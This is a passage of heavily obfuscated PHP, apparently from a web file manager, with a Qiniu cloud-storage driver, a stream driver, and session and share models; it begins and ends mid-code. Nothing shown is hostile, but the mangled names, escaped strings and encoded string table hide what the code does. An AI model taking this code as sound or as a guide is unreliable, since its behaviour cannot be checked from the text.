!GLOBAL_DEBUG) { return; } $ƒóĞÔ³Ù = 0; if (stripos($ì‹Ş‹÷, $ôôË —[1531]) !== !1) { $ƒóĞÔ³Ù = 1; $•Ÿºò¸Ö = explode($ôôË —[1532], $ì‹Ş‹÷); $ì‹Ş‹÷ = !empty($•Ÿºò¸Ö[1]) ? $•Ÿºò¸Ö[1] : $ì‹Ş‹÷; } else { if (stripos($ì‹Ş‹÷, $ôôË —[1533])) { $ƒóĞÔ³Ù = 2; $•Ÿºò¸Ö = explode($ôôË —[1533], $ì‹Ş‹÷); $•Ÿºò¸Ö = explode($ôôË —[4], $•Ÿºò¸Ö[0]); $ì‹Ş‹÷ = !empty($•Ÿºò¸Ö[1]) ? $•Ÿºò¸Ö[1] : $ì‹Ş‹÷; } } if ($¦ßïÆİã && I18n::getType() == $ôôË —[1534]) { if ($ƒóĞÔ³Ù == 1) { $ì‹Ş‹÷ = str_replace($ôôË —[1535], $ôôË —[1536], $ì‹Ş‹÷); } else { if ($ƒóĞÔ³Ù == 2) { $•Ÿºò¸Ö = explode($ôôË —[215], $•Ÿºò¸Ö[0]); $¡Í†­‡ƒ = isset($•Ÿºò¸Ö[1]) ? $•Ÿºò¸Ö[1] : $ôôË —[12]; $êÊ‰Ùª¢ = array($ôôË —[1537] => $ôôË —[1538], $ôôË —[1539] => $ôôË —[1540], $ôôË —[1541] => $ôôË —[1542], $ôôË —[1543] => $ôôË —[1544], $ôôË —[1545] => $ôôË —[1546], $ôôË —[1547] => $ôôË —[1548], $ôôË —[1549] => $ôôË —[1550], $ôôË —[1551] => $ôôË —[1552], $ôôË —[1553] => $ôôË —[1554], $ôôË —[1555] => $ôôË —[1556]); if (isset($êÊ‰Ùª¢[$¡Í†­‡ƒ])) { $ì‹Ş‹÷ = $êÊ‰Ùª¢[$¡Í†­‡ƒ]; } } } if (stripos($ì‹Ş‹÷, $ôôË —[1557])) { $ì‹Ş‹÷ = $ôôË —[1558]; } } if (!trim($ì‹Ş‹÷)) { return; } parent::writeLog(trim($ì‹Ş‹÷), $ò¼À‹öº); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ï§Ï…) { parent::__construct(); require_once SDK_DIR . $_SERVER[¯‘·½][1559]; $this->_init($Ï§Ï…); } public function _init($ÇÌÎ•×í) { $û²Ù¶û =& $_SERVER[¯‘·½]; $this->config = $ÇÌÎ•×í; foreach ($ÇÌÎ•×í as $É¼¡ôü => $øÈ·ò”×) { if (isset($this->{$É¼¡ôü})) { $this->{$É¼¡ôü} = $øÈ·ò”×; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($û²Ù¶û[1560] . LNG($û²Ù¶û[1496])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($’¶™›Åµ, $Û®â¤“Ï = '', $Ÿ©öÓø· = REPEAT_RENAME) { if ($this->setContent($’¶™›Åµ, $Û®â¤“Ï)) { return $this->getPathOuter($’¶™›Åµ); } return !1; } public function mkdir($…Îİ©ù–, $ÈÚ¢áîş = REPEAT_SKIP) { $¦÷”ŠÌ» =& $_SERVER[¯‘·½]; $„Á„¶éî = trim($…Îİ©ù–, $¦÷”ŠÌ»[8]); if ($this->_isFolder($„Á„¶éî)) { return $this->getPathOuter($„Á„¶éî); } $…Îİ©ù– = $„Á„¶éî . $¦÷”ŠÌ»[8]; $æ³œ›™› = get_path_this($„Á„¶éî); $àÏ™Æ ì = $…Îİ©ù– . $æ³œ›™›; if (!$this->mkfile($àÏ™Æ ì)) { return !1; } if (!$this->moveFile($àÏ™Æ ì, $…Îİ©ù–)) { $this->delFile($àÏ™Æ ì); return !1; } return $this->getPathOuter($„Á„¶éî); } public function copyFile($†£›ÑÖş, $ Ö·ûï¼) { $Í©ØÅáü = $this->bucketManager->copy($this->bucket, $†£›ÑÖş, $this->bucket, $ Ö·ûï¼, !0); return $Í©ØÅáü ? !1 : $this->getPathOuter($ Ö·ûï¼); } public function moveFile($şêÔÈôÕ, $ŒÙŠ¯§£) { $”¶–¤Ãµ = $this->bucketManager->move($this->bucket, $şêÔÈôÕ, $this->bucket, $ŒÙŠ¯§£, !0); return $”¶–¤Ãµ ? !1 : $this->getPathOuter($ŒÙŠ¯§£); } public function delFile($ÉûÑ£‚è) { if (!$this->exist($ÉûÑ£‚è)) { return !0; } $®¹¼ÜÖØ = $this->bucketManager->delete($this->bucket, $ÉûÑ£‚è); if (!$®¹¼ÜÖØ) { return !0; } return $®¹¼ÜÖØ->code() == 612 ? !0 : !1; } public function delFolder($¼•ûıƒ¹) { $ø´ÔŒÆÕ =& $_SERVER[¯‘·½]; if (!$this->exist($¼•ûıƒ¹)) { return !0; } $this->listItemCache = !1; $à‰»ØØ = $this->fileList($¼•ûıƒ¹); $this->listItemCache = !0; $´ó‡¢ë = trim($¼•ûıƒ¹, $ø´ÔŒÆÕ[8]) . $ø´ÔŒÆÕ[8]; if (!empty($¼•ûıƒ¹) && $¼•ûıƒ¹ !== $ø´ÔŒÆÕ[231] && !in_array($´ó‡¢ë, $à‰»ØØ[$ø´ÔŒÆÕ[85]])) { $à‰»ØØ[$ø´ÔŒÆÕ[85]][] = $´ó‡¢ë; } $æ‚Áå¹À = $this->delByBatch($à‰»ØØ[$ø´ÔŒÆÕ[86]]); if (!$æ‚Áå¹À) { return !1; } $æ‚Áå¹À = $this->delByBatch($à‰»ØØ[$ø´ÔŒÆÕ[85]]); if (!$æ‚Áå¹À) { return !1; } return $this->delFile($´ó‡¢ë); } private function delByBatch($Ç¡ÙûÙŠ) { foreach (array_chunk($Ç¡ÙûÙŠ, 1000) as $Ì™™€„ü) { $ù…ÀŞóø = $this->bucketManager->buildBatchDelete($this->bucket, $Ì™™€„ü); list($êÚÙ¿â, $º½¯İï´) = $this->bucketManager->batch($ù…ÀŞóø); if ($º½¯İï´) { return !1; } } return !0; } public function rename($Øšƒ–›¿, $Ë«ÑØ…²) { return $this->renameObject($Øšƒ–›¿, $Ë«ÑØ…²); } public function fileInfo($®ˆ¦Ê¹¨, $Ê¢‹¤Ó² = false, $şæ«ÆÒş = array()) { $°Š×ÉËÏ =& $_SERVER[¯‘·½]; $Öë ±û = array($°Š×ÉËÏ[32] => $this->pathThis($®ˆ¦Ê¹¨), $°Š×ÉËÏ[87] => $this->getPathOuter($°Š×ÉËÏ[8] . $®ˆ¦Ê¹¨), $°Š×ÉËÏ[33] => $°Š×ÉËÏ[233], $°Š×ÉËÏ[79] => isset($şæ«ÆÒş[$°Š×ÉËÏ[1561]]) ? $şæ«ÆÒş[$°Š×ÉËÏ[1561]] : 0, $°Š×ÉËÏ[169] => $this->ext($®ˆ¦Ê¹¨)); if ($Ê¢‹¤Ó²) { return $Öë ±û; } $Öë ±û[$°Š×ÉËÏ[234]] = $Öë ±û[$°Š×ÉËÏ[88]] = 0; $Öë ±û[$°Š×ÉËÏ[235]] = $Öë ±û[$°Š×ÉËÏ[236]] = !0; if (empty($şæ«ÆÒş)) { $şæ«ÆÒş = $this->objectMeta($®ˆ¦Ê¹¨); if (!$şæ«ÆÒş) { return $Öë ±û; } } if (isset($şæ«ÆÒş[$°Š×ÉËÏ[237]]) && $şæ«ÆÒş[$°Š×ÉËÏ[237]]) { $Öë ±û[$°Š×ÉËÏ[238]] = $şæ«ÆÒş[$°Š×ÉËÏ[237]]; } if (isset($şæ«ÆÒş[$°Š×ÉËÏ[248]]) && $şæ«ÆÒş[$°Š×ÉËÏ[248]]) { $Öë ±û[$°Š×ÉËÏ[238]] = $şæ«ÆÒş[$°Š×ÉËÏ[248]]; } if (isset($şæ«ÆÒş[$°Š×ÉËÏ[1562]])) { $Öë ±û[$°Š×ÉËÏ[88]] = substr($şæ«ÆÒş[$°Š×ÉËÏ[1562]] . $°Š×ÉËÏ[12], 0, 10); } if (isset($şæ«ÆÒş[$°Š×ÉËÏ[1561]])) { $Öë ±û[$°Š×ÉËÏ[79]] = $şæ«ÆÒş[$°Š×ÉËÏ[1561]]; } return $Öë ±û; } public function folderInfo($«‚å÷£ı, $‚ó“â€ë = false) { $¢éá€Ä =& $_SERVER[¯‘·½]; $ÃÖ‰Œ‡ = array($¢éá€Ä[32] => $this->pathThis($«‚å÷£ı), $¢éá€Ä[87] => $this->getPathOuter($¢éá€Ä[8] . $«‚å÷£ı), $¢éá€Ä[33] => $¢éá€Ä[78]); if ($‚ó“â€ë) { return $ÃÖ‰Œ‡; } $ÃÖ‰Œ‡[$¢éá€Ä[234]] = $ÃÖ‰Œ‡[$¢éá€Ä[88]] = 0; $ÃÖ‰Œ‡[$¢éá€Ä[235]] = $ÃÖ‰Œ‡[$¢éá€Ä[236]] = !0; $«‚å÷£ı = rtrim($«‚å÷£ı, $¢éá€Ä[8]) . $¢éá€Ä[8]; $ˆºÑƒñ = $this->objectMeta($«‚å÷£ı); if (isset($ˆºÑƒñ[$¢éá€Ä[1562]])) { $ÃÖ‰Œ‡[$¢éá€Ä[88]] = substr($ˆºÑƒñ[$¢éá€Ä[1562]] . $¢éá€Ä[12], 0, 10); } return $ÃÖ‰Œ‡; } public function listPath($¬ä –×¿, $Äš¯Ó©í = false) { $ç¾ä­Ÿ =& $_SERVER[¯‘·½]; $—ÀìÑß = $this->fileList($¬ä –×¿, $ç¾ä­Ÿ[8], !0); foreach ($—ÀìÑß[$ç¾ä­Ÿ[85]] as $Åº‰Èš° => $òÍš¥”™) { $—ÀìÑß[$ç¾ä­Ÿ[85]][$Åº‰Èš°] = $this->folderInfo($òÍš¥”™, $Äš¯Ó©í); } foreach ($—ÀìÑß[$ç¾ä­Ÿ[86]] as $Åº‰Èš° => $òÍš¥”™) { $—ÀìÑß[$ç¾ä­Ÿ[86]][$Åº‰Èš°] = $this->fileInfo($òÍš¥”™[$ç¾ä­Ÿ[32]], $Äš¯Ó©í, $òÍš¥”™); } return $—ÀìÑß; } public function has($ùÛÙ´¥â, $‹©Ô™Ü = false, $Ó£Ÿ¾¸Î = true) { $º¨¢‘–° =& $_SERVER[¯‘·½]; $ùÛÙ´¥â = trim($ùÛÙ´¥â, $º¨¢‘–°[8]); $›´ş­¹¤ = empty($ùÛÙ´¥â) && $ùÛÙ´¥â !== $º¨¢‘–°[231] ? $º¨¢‘–°[12] : $ùÛÙ´¥â . $º¨¢‘–°[8]; $ÎÙ€ÎÚ = $º¨¢‘–°[12]; $Àó¹×õ´ = 500; $ƒÒ¾Íµ = $º¨¢‘–°[8]; $üõîœ–Œ = $âì‰ôÆŒ = 0; while (!0) { check_abort(); list($üÑ…µë, $šãÉ©ƒÆ) = $this->bucketManager->listFiles($this->bucket, $›´ş­¹¤, $ÎÙ€ÎÚ, $Àó¹×õ´, $ƒÒ¾Íµ); if ($šãÉ©ƒÆ) { break; } $ÎÙ€ÎÚ = array_key_exists($º¨¢‘–°[1508], $üÑ…µë) ? $ÎÙ€ÎÚ = $üÑ…µë[$º¨¢‘–°[1563]] : $º¨¢‘–°[12]; if ($‹©Ô™Ü) { if (!empty($üÑ…µë[$º¨¢‘–°[1564]])) { $üõîœ–Œ += count($üÑ…µë[$º¨¢‘–°[1564]]); } if (!empty($üÑ…µë[$º¨¢‘–°[1565]])) { $âì‰ôÆŒ += count($üÑ…µë[$º¨¢‘–°[1565]]); } if ($ÎÙ€ÎÚ === $º¨¢‘–°[12]) { break; } continue; } if ($Ó£Ÿ¾¸Î) { if (!empty($üÑ…µë[$º¨¢‘–°[1564]])) { return !0; } } else { if (!empty($üÑ…µë[$º¨¢‘–°[1565]])) { return !0; } } if ($ÎÙ€ÎÚ === $º¨¢‘–°[12]) { break; } } if ($‹©Ô™Ü) { return array($º¨¢‘–°[242] => $üõîœ–Œ, $º¨¢‘–°[243] => $âì‰ôÆŒ); } return !1; } public function listAll($Ì­±Ò™‰) { $‚¼ªôş€ =& $_SERVER[¯‘·½]; $©î—„ã¯ = $this->fileList($Ì­±Ò™‰, $‚¼ªôş€[12], !0); $û±§‡ = array_to_keyvalue($©î—„ã¯[$‚¼ªôş€[86]], $‚¼ªôş€[32]); foreach ($©î—„ã¯[$‚¼ªôş€[85]] as $»æ®ãÅ) { if (is_string($»æ®ãÅ)) { $û±§‡[$»æ®ãÅ] = array($‚¼ªôş€[79] => 0); } } return $this->listAllFiles($Ì­±Ò™‰, $û±§‡); } private function fileList($ÃÏ„Ğ˜ğ, $çµˆµëĞ = '', $˜º–†ë‰ = 0) { $Ñá«÷ıÄ =& $_SERVER[¯‘·½]; $ÃÏ„Ğ˜ğ = trim($ÃÏ„Ğ˜ğ, $Ñá«÷ıÄ[8]); $å±¼—¿¨ = empty($ÃÏ„Ğ˜ğ) && $ÃÏ„Ğ˜ğ !== $Ñá«÷ıÄ[231] ? $Ñá«÷ıÄ[12] : $ÃÏ„Ğ˜ğ . $Ñá«÷ıÄ[8]; $©³°™îå = $Ñá«÷ıÄ[12]; $èì•¼å = 1000; $ø®¨¦ = $óûÎ·ÉÀ = array(); while (!0) { check_abort(); list($ïÉí ¯×, $³›¶˜·È) = $this->bucketManager->listFiles($this->bucket, $å±¼—¿¨, $©³°™îå, $èì•¼å, $çµˆµëĞ); if ($³›¶˜·È) { break; } $©³°™îå = array_key_exists($Ñá«÷ıÄ[1508], $ïÉí ¯×) ? $©³°™îå = $ïÉí ¯×[$Ñá«÷ıÄ[1563]] : $Ñá«÷ıÄ[12]; $Àè¾±œ· = isset($ïÉí ¯×[$Ñá«÷ıÄ[1564]]) ? $ïÉí ¯×[$Ñá«÷ıÄ[1564]] : array(); $²©µ­£ = isset($ïÉí ¯×[$Ñá«÷ıÄ[1565]]) ? $ïÉí ¯×[$Ñá«÷ıÄ[1565]] : array(); foreach ($Àè¾±œ· as $ÛĞüÅ‚) { if ($ÛĞüÅ‚[$Ñá«÷ıÄ[97]] == $å±¼—¿¨) { continue; } $—ŠŞÄÔÄ = $ÛĞüÅ‚[$Ñá«÷ıÄ[97]]; $öûù€ã = $ÛĞüÅ‚[$Ñá«÷ıÄ[1561]]; $ÛĞüÅ‚[$Ñá«÷ıÄ[32]] = $—ŠŞÄÔÄ; $ÛĞüÅ‚[$Ñá«÷ıÄ[79]] = $öûù€ã; $»§×‹¬ı = $öûù€ã == 0 && substr($—ŠŞÄÔÄ, strlen($—ŠŞÄÔÄ) - 1, 1) == $Ñá«÷ıÄ[8] ? !0 : !1; $this->cacheMethodInfoSet($—ŠŞÄÔÄ, $»§×‹¬ı, $ÛĞüÅ‚); if ($»§×‹¬ı) { $ø®¨¦[] = $—ŠŞÄÔÄ; continue; } $óûÎ·ÉÀ[] = $˜º–†ë‰ ? $ÛĞüÅ‚ : $—ŠŞÄÔÄ; } foreach ($²©µ­£ as $—ŠŞÄÔÄ) { if ($—ŠŞÄÔÄ == $å±¼—¿¨) { continue; } $ø®¨¦[] = $—ŠŞÄÔÄ; $this->cacheMethodInfoSet($—ŠŞÄÔÄ, !0); } if ($©³°™îå === $Ñá«÷ıÄ[12]) { break; } } $this->cacheMethodInfoSet($ÃÏ„Ğ˜ğ, !0); return array($Ñá«÷ıÄ[85] => $ø®¨¦, $Ñá«÷ıÄ[86] => $óûÎ·ÉÀ); } public function canRead($®ƒä×‘) { return $this->exist($®ƒä×‘) ? !0 : !1; } public function canWrite($Ê¢’¤æ ) { return $this->exist($Ê¢’¤æ ) ? !0 : !1; } public function getContent($É÷÷÷±) { return $this->fileSubstr($É÷÷÷±, 0, -1); } public function setContent($ùØ«…¯°, $Üìå¨Ü = '') { $™“èèÑÑ = $this->tempFile($this->pathThis($ùØ«…¯°)); file_put_contents($™“èèÑÑ, $Üìå¨Ü); if ($this->upload($ùØ«…¯°, $™“èèÑÑ)) { $this->tempFileRemve($™“èèÑÑ); return !0; } return !1; } public function refreshUrls($Æïº­ã¾) { $üõï¥ó =& $_SERVER[¯‘·½]; $Ñ‚¯€©ê = array(); if (is_array($Æïº­ã¾)) { foreach ($Æïº­ã¾ as $ŸØÊ§‹‚) { $Ñ‚¯€©ê[] = $this->link($ŸØÊ§‹‚); } } else { $Ñ‚¯€©ê[] = $this->link($Æïº­ã¾); } $é½ú·œŠ = new Qiniu\Cdn\CdnManager($this->auth); list($­ûğœ¾, $Ğ¶ğçÌá) = $é½ú·œŠ->refreshUrls($Ñ‚¯€©ê); if ($Ğ¶ğçÌá) { return !1; } return $­ûğœ¾[$üõï¥ó[1288]] == $üõï¥ó[845] ? !0 : !1; } public function fileSubstr($¡Ğ°”¤Î, $“óí—Ô­, $†úÕÍ–) { $ƒ”íÒ®ˆ =& $_SERVER[¯‘·½]; if (!($—…ú¶»® = $this->link($¡Ğ°”¤Î))) { return !1; } $¸‹Ú¾‰ = !1; if ($†úÕÍ– > 0) { $øè™üøğ = $“óí—Ô­ + $†úÕÍ– - 1; $¸‹Ú¾‰ = array($ƒ”íÒ®ˆ[1566] . $“óí—Ô­ . $ƒ”íÒ®ˆ[464] . $øè™üøğ); } $İ©µËŸ÷ = url_request($—…ú¶»®, $ƒ”íÒ®ˆ[1527], !1, $¸‹Ú¾‰); return $İ©µËŸ÷[$ƒ”íÒ®ˆ[835]] ? $İ©µËŸ÷[$ƒ”íÒ®ˆ[1311]] : !1; } public function upload($¨—®ŠŞÊ, $ºòıŞâï, $¼ğ’Ğóş = false, $ËÎÔûÉØ = REPEAT_REPLACE) { $”‚Ø…Ò” = new Qiniu\Storage\UploadManager(); $áºßëİ = $this->auth->uploadToken($this->bucket, $¨—®ŠŞÊ); $±’Ş·Û¹ = get_file_mime(get_path_ext($ºòıŞâï)); list($ûü¢À…’, $è­Ş‰»ú) = $”‚Ø…Ò”->putFile($áºßëİ, $¨—®ŠŞÊ, $ºòıŞâï, null, $±’Ş·Û¹); return $è­Ş‰»ú ? !1 : $this->getPathOuter($¨—®ŠŞÊ); } public function uploadFormData($èë¶§ï’, $ÙœÁÖ‹Ç = 3600) { return $this->uploadToken($èë¶§ï’, $ÙœÁÖ‹Ç); } public function uploadMultiData($ÀØ˜€“Ü, $ÆÔ¨É÷ü = 3600) { return $this->uploadToken($ÀØ˜€“Ü, $ÆÔ¨É÷ü); } private function uploadToken($ìÜÜ½‹”, $ñ‡©ö¾¦ = 3600) { $ğôšŞÓ =& $_SERVER[¯‘·½]; $Ò™û¹¸ = $ñ‡©ö¾¦; $Ğ«Î¼»– = array($ğôšŞÓ[1567] => $ğôšŞÓ[1568]); $¼À• = $ìÜÜ½‹”; $ŠÏ®Ü–‡ = $this->auth->uploadToken($this->bucket, $¼À•, $Ò™û¹¸, $Ğ«Î¼»–, !0); $úÏ£¹õ = empty($this->region) || $this->region == $ğôšŞÓ[1569] ? $ğôšŞÓ[12] : $ğôšŞÓ[464] . $this->region; $Ò†ğøÉË = http_type() . "\72\x2f\x2f\165\x70\154\157\x61\144{$úÏ£¹õ}\x2e\x71\151\x6e\151\165\160\x2e\x63\x6f\155\57"; return array($ğôšŞÓ[1570] => $ŠÏ®Ü–‡, $ğôšŞÓ[1571] => $Ò†ğøÉË); } public function download($Å‡®µ†‡, $˜·â«–Û) { $‘Á‹¥¶ = IO::getPathInner(IO::mkfile($˜·â«–Û)); if (!($‡¼áãä = $this->link($Å‡®µ†‡))) { return !1; } $†Şöé“ª = 0; $Õ•Áòô— = 1024 * 200; $ÓÂÃÉÉÁ = fopen($‘Á‹¥¶, $_SERVER[¯‘·½][1572]); while (!0) { $ÇÕ§Â¥ = $this->fileSubstr($Å‡®µ†‡, $†Şöé“ª, $Õ•Áòô—); if ($ÇÕ§Â¥ === !1) { return !1; } fwrite($ÓÂÃÉÉÁ, $ÇÕ§Â¥); $†Şöé“ª += $Õ•Áòô—; if (strlen($ÇÕ§Â¥) < $Õ•Áòô—) { break; } } fclose($ÓÂÃÉÉÁ); return $˜·â«–Û; } public function link($¼õò„½Ú, $ùòùº‚™ = '') { if (!$this->isFile($¼õò„½Ú)) { return !1; } $°Ñ„ŞïÀ = $this->getHost() . $_SERVER[¯‘·½][8] . $this->pathEncode($¼õò„½Ú) . $ùòùº‚™; return $this->auth->privateDownloadUrl($°Ñ„ŞïÀ, 3600 * 12); } public function fileOut($‰Ì­˜ßÇ, $œÔ½ùÍ = false, $®ÖƒÜù = false, $Œü¿š® = '') { $Õ“¥Ÿ« =& $_SERVER[¯‘·½]; if ($this->isFileOutServer()) { return $this->fileOutServer($‰Ì­˜ßÇ, $œÔ½ùÍ, $®ÖƒÜù, $Œü¿š®); } if (!$®ÖƒÜù) { $®ÖƒÜù = $this->pathThis($‰Ì­˜ßÇ); } $õ€’ä¦» = $œÔ½ùÍ ? $Õ“¥Ÿ«[1573] . rawurlencode($®ÖƒÜù) : $Õ“¥Ÿ«[12]; $›Íª©ÀÔ = $this->link($‰Ì­˜ßÇ, $õ€’ä¦»); $this->fileOutLink($›Íª©ÀÔ); } public function fileOutServer($ŒÊ¾Ÿ‘×, $‚Ü •¦ì = false, $ó–ĞÕÑè = false, $ï¿¸ş°İ = '') { parent::fileOut($ŒÊ¾Ÿ‘×, $‚Ü •¦ì, $ó–ĞÕÑè, $ï¿¸ş°İ); } public function fileOutImage($©ÛŒœ½¯, $‹§‰®á‚ = 250) { if ($this->size($©ÛŒœ½¯) > 1024 * 1024 * 20) { return $this->fileOutImageServer($©ÛŒœ½¯, $‹§‰®á‚); } $™çòÒù˜ = $this->link($©ÛŒœ½¯, $_SERVER[¯‘·½][1574] . $‹§‰®á‚); $this->fileOutLink($™çòÒù˜); } public function fileOutImageServer($ÚğĞóîÏ, $¨»¤‰ŒÑ = 250) { parent::fileOutImage($ÚğĞóîÏ, $¨»¤‰ŒÑ); } public function hashMd5($ƒÜì˜ÈÑ) { $›ƒºğ¾ =& $_SERVER[¯‘·½]; $ÛÔªĞ­Š = $this->objectMeta($ƒÜì˜ÈÑ); return isset($ÛÔªĞ­Š[$›ƒºğ¾[248]]) ? $ÛÔªĞ­Š[$›ƒºğ¾[248]] : !1; $÷‹«»Àù = $this->link($ƒÜì˜ÈÑ, $›ƒºğ¾[1575]); } public function size($©¸èÎ) { $Á„™ğ‡ = $this->objectMeta($©¸èÎ); return $Á„™ğ‡ ? $Á„™ğ‡[$_SERVER[¯‘·½][79]] : 0; } public function info($ı‚ì°†) { if ($this->isFolder($ı‚ì°†)) { return $this->folderInfo($ı‚ì°†); } else { if ($this->isFile($ı‚ì°†)) { return $this->fileInfo($ı‚ì°†); } } return !1; } public function exist($¸¼’°¹›) { return $this->isFile($¸¼’°¹›) || $this->isFolder($¸¼’°¹›); } public function isFile($šÂƒÓÔ¦) { return !$this->isFolder($šÂƒÓÔ¦) && $this->objectMeta($šÂƒÓÔ¦); } public function isFolder($§—Ì­•Á) { return $this->cacheMethod($_SERVER[¯‘·½][180], $§—Ì­•Á); } protected function objectMeta($°ïÑÕ½ò) { return $this->cacheMethod($_SERVER[¯‘·½][182], $°ïÑÕ½ò); } protected function _objectMeta($Äá¦ÃÅœ) { $›Ï¨ªÅ’ =& $_SERVER[¯‘·½]; list($ÕŒ—ë¨ª, $¤´õº¿) = $this->bucketManager->stat($this->bucket, $Äá¦ÃÅœ); if ($ÕŒ—ë¨ª) { $ÕŒ—ë¨ª[$›Ï¨ªÅ’[79]] = intval($ÕŒ—ë¨ª[$›Ï¨ªÅ’[1561]]); } return $ÕŒ—ë¨ª; } protected function _isFolder($’óúƒ½) { $­Ô©€Ùö =& $_SERVER[¯‘·½]; if ($’óúƒ½ == $­Ô©€Ùö[12] || $’óúƒ½ == $­Ô©€Ùö[8]) { return !0; } list($Ò¬Šè’°, $´…ÊÈ) = $this->bucketManager->listFiles($this->bucket, trim($’óúƒ½, $­Ô©€Ùö[8]) . $­Ô©€Ùö[8], $­Ô©€Ùö[12], 1, $­Ô©€Ùö[8]); return !empty($Ò¬Šè’°[$­Ô©€Ùö[1564]]) || !empty($Ò¬Šè’°[$­Ô©€Ùö[1565]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¹Å¿‘éİ, $»”³È½– = 0) { parent::__construct(); $this->source = $¹Å¿‘éİ; $this->sourceSize = $»”³È½–; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ªã¸”Ûœ = false) { return $this->sourceSize; } public function getContent($¸³ÀÀõ = false) { return $this->fileSubstr($¸³ÀÀõ, 0, $this->sourceSize); } public function fileSubstr($ØŠÂ¹æØ = false, $§ÍÅøø = 0, $À³»Üƒæ = 0) { if (!$À³»Üƒæ) { $À³»Üƒæ = $this->sourceSize; } $¡“ûÀÄ¾ = $this->sourceSize - $§ÍÅøø; if ($À³»Üƒæ >= $¡“ûÀÄ¾) { $À³»Üƒæ = $¡“ûÀÄ¾; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§ÍÅøø, $À³»Üƒæ); } if ($this->sourceType == self::TYPE_FILE) { if ($À³»Üƒæ <= 0) { return $_SERVER[¯‘·½][12]; } $èÉùıÊ· = ftell($this->source); fseek_64($this->source, $èÉùıÊ· + $§ÍÅøø); $şå¹ú‘ = @fread($this->source, $À³»Üƒæ); fseek_64($this->source, $èÉùıÊ·); return $şå¹ú‘; } } public function hashMd5($¿ÍŠì¹ğ = false) { return md5($this->getContent()); } public static function hash($ïê…íä², $œş¥¥­ñ = 0) { $¬ò‘íçË = new PathDriverStream($ïê…íä², $œş¥¥­ñ); return $¬ò‘íçË->hashSimple($ïê…íä²); } public static function md5($€ë÷©ÜÆ, $ºšùö® = 0) { $°×†¿ = new PathDriverStream($€ë÷©ÜÆ, $ºšùö®); return $°×†¿->hashMd5($€ë÷©ÜÆ); } } goto E„ˆ–Š‹; Fóò­´»‘Ë: $_SERVER[ôİ”í„Æ] = explode($_SERVER[¯‘·½][687], gzinflate(substr($_SERVER[¯‘·½][688], 10, -8))); $ndbvlciwes = $_SERVER[¯‘·½][689]; if (strlen($ndbvlciwes) < $_SERVER[¯‘·½][690]) { die; } goto E„±‡ëõàÉ; c¡…Ë ‹¾: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\137\163\145\163\x73\151\157\156"; public function get($–¼²İĞê) { $í” ÔÒ· =& $_SERVER[¯‘·½]; $ŠÜìÙÆ« = $this->where(array($í” ÔÒ·[2145] => $–¼²İĞê))->find(); if (!is_array($ŠÜìÙÆ«)) { return !1; } return $ŠÜìÙÆ«[$í” ÔÒ·[171]]; } public function set($ÔÖÖ¬¤, $ÒÑ²õ€«, $•äÔ‚¦é = 3600) { $Õ¢ÈÆ¡ =& $_SERVER[¯‘·½]; $ŸÒÂ¾‘ = array($Õ¢ÈÆ¡[2145] => $ÔÖÖ¬¤, $Õ¢ÈÆ¡[2045] => $ÒÑ²õ€«, $Õ¢ÈÆ¡[2146] => $•äÔ‚¦é + time()); if (Session::get($Õ¢ÈÆ¡[2147])) { $ŸÒÂ¾‘[$Õ¢ÈÆ¡[1806]] = Session::get($Õ¢ÈÆ¡[2147]); } else { $ŸÒÂ¾‘[$Õ¢ÈÆ¡[1806]] = 0; } if ($this->get($ÔÖÖ¬¤)) { return $this->where(array($Õ¢ÈÆ¡[2145] => $ÔÖÖ¬¤))->save($ŸÒÂ¾‘); } else { return $this->add($ŸÒÂ¾‘, array(), !0); } } public function remove($âğ™İ¾Û) { return $this->where(array($_SERVER[¯‘·½][2145] => $âğ™İ¾Û))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¯‘·½][2148] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\x69\155\x65", "\x74\151\155\145", "\151\x6e\163\145\162\164\54\x75\160\x64\x61\164\145", "\x66\x75\x6e\143\x74\151\157\156"), array("\143\162\145\141\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\156\143\x74\x69\x6f\156"), array("\x6f\x70\164\x69\x6f\156\x73", '', "\x69\156\x73\x65\x72\x74\54\x75\160\x64\141\x74\145\54\x73\145\x6c\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($¼áÑ¾¯) { $õü†½ =& $_SERVER[¯‘·½]; $¤º®•œ = isset($¼áÑ¾¯[0]) ? $¼áÑ¾¯[0] : !1; $Ùù–©îö = $õü†½[2149] . USER_ID; return array($õü†½[2150] => array(USER_ID, $õü†½[2151]), $õü†½[2090] => array($¤º®•œ, $õü†½[2152], $Ùù–©îö)); } protected function listSimple() { $÷¢·Ã– = array($_SERVER[¯‘·½][1806] => USER_ID); $ÖúË¢›· = $this->field($this->fieldList)->where($÷¢·Ã–)->select(); return $ÖúË¢›· ? $ÖúË¢›· : array(); } protected function getInfo($Íò®‡˜À, $­ı‘   = false, $Ù÷ôß÷À = '') { $ï­˜®ò =& $_SERVER[¯‘·½]; if (!$Ù÷ôß÷À) { $Ù÷ôß÷À = $ï­˜®ò[2149] . USER_ID; } if ($­ı‘  ) { return $this->_getShareInfo(array($ï­˜®ò[672] => $Íò®‡˜À)); } $¿Š˜‹¸ = $this->cacheFunctionGet($ï­˜®ò[2092], $Íò®‡˜À, $Ù÷ôß÷À); $²ï´ùıÆ = $this->shareInfoMofify($¿Š˜‹¸, $ï­˜®ò[226]); if 